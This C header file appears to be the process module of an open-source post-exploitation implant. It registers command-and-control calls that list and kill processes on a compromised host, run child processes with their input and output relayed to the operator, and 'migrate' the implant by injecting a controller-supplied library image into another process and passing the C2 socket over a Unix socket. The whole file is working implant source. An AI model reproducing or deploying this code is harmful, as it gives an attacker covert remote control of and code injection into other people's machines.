/*
 * MIT License
 *
 * Copyright (c) 2020-2024 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#ifndef _PROCESS_H_
#define _PROCESS_H_

#include <sigar.h>
#include <stdio.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>

#include <api.h>
#include <c2.h>
#include <core.h>
#include <tlv_types.h>
#include <child.h>
#include <tlv.h>
#include <migrate.h>
#include <pipe.h>
#include <proc.h>
#include <log.h>

#include <net_client.h>
#include <net_server.h>

#define PROCESS_BASE 2

#define PROCESS_LIST \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       PROCESS_BASE, \
                       API_CALL)
#define PROCESS_KILL \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       PROCESS_BASE, \
                       API_CALL + 1)
#define PROCESS_GET_PID \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       PROCESS_BASE, \
                       API_CALL + 2)
#define PROCESS_MIGRATE \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       PROCESS_BASE, \
                       API_CALL + 3)
#define PROCESS_KILLALL \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       PROCESS_BASE, \
                       API_CALL + 4)

#define PROCESS_PIPE \
        TLV_PIPE_CUSTOM(PIPE_STATIC, \
                        PROCESS_BASE, \
                        PIPE_TYPE)

#define TLV_TYPE_PID_NAME  TLV_TYPE_CUSTOM(TLV_TYPE_STRING, PROCESS_BASE, API_TYPE)
#define TLV_TYPE_PID_CPU   TLV_TYPE_CUSTOM(TLV_TYPE_STRING, PROCESS_BASE, API_TYPE + 1)
#define TLV_TYPE_PID_PATH  TLV_TYPE_CUSTOM(TLV_TYPE_STRING, PROCESS_BASE, API_TYPE + 2)

#define TLV_TYPE_PROCESS_ARGV TLV_TYPE_CUSTOM(TLV_TYPE_STRING, PROCESS_BASE, API_TYPE + 3)
#define TLV_TYPE_PROCESS_ENV  TLV_TYPE_CUSTOM(TLV_TYPE_STRING, PROCESS_BASE, API_TYPE + 4)

extern char **environ;

struct eio_migrate_table
{
    net_server_t *server;
    c2_t *c2;
};

static tlv_pkt_t *process_list(c2_t *c2)
{
    int iter;
    int status;

    core_t *core;
    tlv_pkt_t *result;
    tlv_pkt_t *proc_info;

    sigar_pid_t proc_pid;
    sigar_proc_state_t proc_state;
    sigar_proc_exe_t proc_exec;
    sigar_proc_list_t proc_list;

    core = c2->data;

    if ((status = sigar_proc_list_get(core->sigar, &proc_list)) != SIGAR_OK)
    {
        log_debug("* Failed to sigar process list (%s)\n",
                  sigar_strerror(core->sigar, status));
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);

    for (iter = 0; iter < proc_list.number; iter++)
    {
        proc_pid = proc_list.data[iter];
        proc_info = tlv_pkt_create();

        tlv_pkt_add_u32(proc_info, TLV_TYPE_PID, (int)proc_pid);

        if ((status = sigar_proc_state_get(core->sigar, proc_pid, &proc_state)) == SIGAR_OK)
        {
            tlv_pkt_add_string(proc_info, TLV_TYPE_PID_NAME, proc_state.name);
        }

        if ((status = sigar_proc_exe_get(core->sigar, proc_pid, &proc_exec)) == SIGAR_OK)
        {
            tlv_pkt_add_string(proc_info, TLV_TYPE_PID_CPU, (char *)proc_exec.arch);
            tlv_pkt_add_string(proc_info, TLV_TYPE_PID_PATH, (char *)proc_exec.name);
        }

        tlv_pkt_add_tlv(result, TLV_TYPE_GROUP, proc_info);
        tlv_pkt_destroy(proc_info);
    }

    sigar_proc_list_destroy(core->sigar, &proc_list);

    return result;
}

static tlv_pkt_t *process_kill(c2_t *c2)
{
    int pid;
    core_t *core;

    core = c2->data;
    tlv_pkt_get_u32(c2->request, TLV_TYPE_PID, &pid);

    if (proc_kill(core->sigar, pid) == -1)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

static tlv_pkt_t *process_killall(c2_t *c2)
{
    int pid;
    char name[128];
    core_t *core;

    core = c2->data;
    tlv_pkt_get_string(c2->request, TLV_TYPE_PID_NAME, name);

    if ((pid = proc_find(core->sigar, name)) != -1)
    {
        proc_kill(core->sigar, pid);
        return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
    }

    return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
}

static tlv_pkt_t *process_get_pid(c2_t *c2)
{
    tlv_pkt_t *result;
    core_t *core;

    core = c2->data;

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
    tlv_pkt_add_u32(result, TLV_TYPE_PID, sigar_pid_get(core->sigar));

    return result;
}

static void process_load_library(struct eio_req *request)
{
    int length;
    unsigned char *image;
    struct eio_migrate_table *table;
    pid_t pid;

    table = request->data;
    tlv_pkt_get_u32(table->c2->request, TLV_TYPE_PID, &pid);

    if ((length = tlv_pkt_get_bytes(table->c2->request, TLV_TYPE_MIGRATE, &image)) > 0)
    {
        if (migrate_init(pid, length, image) == 0)
        {
            free(image);

            net_server_stop(table->server);
            net_server_free(table->server);

            table->c2->response = api_craft_tlv_pkt(API_CALL_QUIT, table->c2->request);
            c2_enqueue_tlv(table->c2, table->c2->response);

            tlv_pkt_destroy(table->c2->request);
            tlv_pkt_destroy(table->c2->response);

            return;
        }

        free(image);
    }

    net_server_stop(table->server);
    net_server_free(table->server);

    table->c2->response = api_craft_tlv_pkt(API_CALL_FAIL, table->c2->request);
    c2_enqueue_tlv(table->c2, table->c2->response);

    tlv_pkt_destroy(table->c2->request);
    tlv_pkt_destroy(table->c2->response);
}

static void process_migrate_accept(int event, void *data)
{
    int sock;
    net_t *net;
    net_t *c2_net;
    char buf[sizeof(int)];

    struct iovec iov;
    struct msghdr msg;
    struct cmsghdr *pcmsghdr;

    char buffer[CMSG_SPACE(sizeof(int))];

    if (event != NET_SERVER_CLIENT)
    {
        return;
    }

    net = data;
    c2_net = net->link_data;
    sock = c2_net->io->pipe[0];

    log_debug("* Sending file (%d)\n", sock);

    memset(buf, 0, sizeof(int));
    iov.iov_base = (void*)buf;
    iov.iov_len = sizeof(int);
    msg.msg_name = NULL;
    msg.msg_namelen = 0;
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = buffer;
    msg.msg_controllen = sizeof(buffer);
    msg.msg_flags = 0;

    pcmsghdr = CMSG_FIRSTHDR(&msg);
    pcmsghdr->cmsg_len = CMSG_LEN(sizeof(int));
    pcmsghdr->cmsg_level = SOL_SOCKET;
    pcmsghdr->cmsg_type = SCM_RIGHTS;

    *((int*)CMSG_DATA(pcmsghdr)) = sock;
    sendmsg(net->io->pipe[0], &msg, 0);

    net_free(net);
}

static tlv_pkt_t *process_migrate(c2_t *c2)
{
    struct eio_migrate_table table;

    table.c2 = c2;
    table.server = net_server_create();

    if (table.server == NULL)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    net_server_setup(table.server, c2->loop);
    net_server_set_links(table.server, NULL, NULL,
                         process_migrate_accept, c2);
    net_server_start(table.server, NET_PROTO_UNIX, "#IPCSocket", 0);

    eio_custom(process_load_library, 0, NULL, &table);
    return NULL;
}

static void process_child_exit_link(void *data)
{
    pipe_t *pipe;
    child_t *child;
    tlv_pkt_t *result;

    pipe = data;
    child = pipe->data;

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, NULL);

    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_TYPE, PROCESS_PIPE);
    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_ID, pipe->id);
    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_HEARTBEAT, API_CALL_FAIL);

    c2_enqueue_tlv(pipe->c2, result);
    tlv_pkt_destroy(result);
}

static void process_child_out_link(void *data)
{
    pipe_t *pipe;
    child_t *child;
    queue_t *queue;
    size_t length;
    tlv_pkt_t *result;
    unsigned char *buffer;

    pipe = data;
    child = pipe->data;
    queue = child->out_queue.queue;
    length = queue->bytes;

    buffer = malloc(length);
    if (buffer == NULL)
    {
        return;
    }

    child_read(child, buffer, length);
    result = api_craft_tlv_pkt(API_CALL_SUCCESS, NULL);

    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_TYPE, PROCESS_PIPE);
    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_ID, pipe->id);
    tlv_pkt_add_bytes(result, TLV_TYPE_PIPE_BUFFER, buffer, length);

    c2_enqueue_tlv(pipe->c2, result);

    tlv_pkt_destroy(result);
    free(buffer);
}

static void process_child_err_link(void *data)
{
    pipe_t *pipe;
    child_t *child;
    queue_t *queue;
    size_t length;
    tlv_pkt_t *result;
    unsigned char *buffer;

    pipe = data;
    child = pipe->data;
    queue = child->err_queue.queue;
    length = queue->bytes;

    buffer = malloc(length);
    if (buffer == NULL)
    {
        return;
    }

    child_read(child, buffer, length);
    result = api_craft_tlv_pkt(API_CALL_SUCCESS, NULL);

    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_TYPE, PROCESS_PIPE);
    tlv_pkt_add_u32(result, TLV_TYPE_PIPE_ID, pipe->id);
    tlv_pkt_add_bytes(result, TLV_TYPE_PIPE_BUFFER, buffer, length);

    c2_enqueue_tlv(pipe->c2, result);

    tlv_pkt_destroy(result);
    free(buffer);
}

static int process_create(pipe_t *pipe, c2_t *c2)
{
    char path[PATH_MAX];
    char args[128];

    child_t *child;
    child_options_t options;

    options.args = NULL;
    options.env = environ;

    tlv_pkt_get_u32(c2->request, TLV_TYPE_INT, &options.flags);
    tlv_pkt_get_string(c2->request, TLV_TYPE_FILENAME, path);

    if (tlv_pkt_get_string(c2->request, TLV_TYPE_PROCESS_ARGV, args) > 0)
    {
        options.args = args;
    }

    child = child_create(path, NULL, &options);

    if (child == NULL)
    {
        return -1;
    }

    if (pipe->flags & PIPE_INTERACTIVE)
    {
        child_set_links(child,
                        process_child_out_link,
                        process_child_err_link,
                        process_child_exit_link,
                        pipe);
    }
    else
    {
        child_set_links(child, NULL, NULL, NULL, pipe);
    }

    log_debug("* Child created for process (%s)\n", path);

    pipe->data = child;
    pipe->c2 = c2;

    return 0;
}

static int process_tell(pipe_t *pipe)
{
    child_t *child;

    queue_t *out_queue;
    queue_t *err_queue;

    child = pipe->data;

    out_queue = child->out_queue.queue;
    err_queue = child->err_queue.queue;

    if (out_queue->bytes == 0)
    {
        log_debug("* Child has (%d) bytes in err\n", out_queue->bytes);
        return err_queue->bytes;
    }

    log_debug("* Child has (%d) bytes in out\n", out_queue->bytes);
    return out_queue->bytes;
}

static int process_read(pipe_t *pipe, void *buffer, int length)
{
    child_t *child;

    log_debug("* Reading from child (%d bytes)\n", length);

    child = pipe->data;
    return child_read(child, buffer, length);
}

static int process_write(pipe_t *pipe, void *buffer, int length)
{
    child_t *child;

    log_debug("* Writing to child (%d bytes)\n", length);

    child = pipe->data;
    return child_write(child, buffer, length);
}

static int process_heartbeat(pipe_t *pipe, c2_t *c2)
{
    child_t *child;

    child = pipe->data;

    if (child->status == CHILD_DEAD)
    {
        log_debug("* Child is DEAD\n");
        return -1;
    }

    log_debug("* Child is ALIVE\n");
    return 0;
}

static int process_destroy(pipe_t *pipe, c2_t *c2)
{
    child_t *child;

    child = pipe->data;
    log_debug("* Killing child process (PID: %d)\n", child->pid);

    if (child->status != CHILD_DEAD)
    {
        child_kill(child);
    }

    child_destroy(child);
    return 0;
}

void register_process_api_calls(api_calls_t **api_calls)
{
    api_call_register(api_calls, PROCESS_LIST, process_list);
    api_call_register(api_calls, PROCESS_KILL, process_kill);
    api_call_register(api_calls, PROCESS_GET_PID, process_get_pid);
    api_call_register(api_calls, PROCESS_MIGRATE, process_migrate);
    api_call_register(api_calls, PROCESS_KILLALL, process_killall);
}

void register_process_api_pipes(pipes_t **pipes)
{
    pipe_callbacks_t callbacks;

    callbacks.create_cb = process_create;
    callbacks.read_cb = process_read;
    callbacks.write_cb = process_write;
    callbacks.tell_cb = process_tell;
    callbacks.heartbeat_cb = process_heartbeat;
    callbacks.destroy_cb = process_destroy;

    api_pipe_register(pipes, PROCESS_PIPE, callbacks);
}

#endif
